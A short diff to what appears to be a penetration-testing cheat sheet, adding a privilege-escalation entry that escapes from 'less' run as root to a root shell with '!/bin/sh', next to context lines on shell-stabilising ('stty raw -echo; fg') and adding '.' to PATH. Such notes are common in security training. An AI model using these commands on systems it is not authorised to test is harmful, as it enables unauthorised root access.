@@ -51,6 +51,13 @@ $stty raw -echo; fg
 
 
 ## Privilege Escalation:
+
++ <b>less</b>
+```
+less [file in path user is allowed to execute less as root with]
+!/bin/sh
+```
+
 + <b>Add '.' to $PATH</b>
 ```
 PATH=.:${PATH}
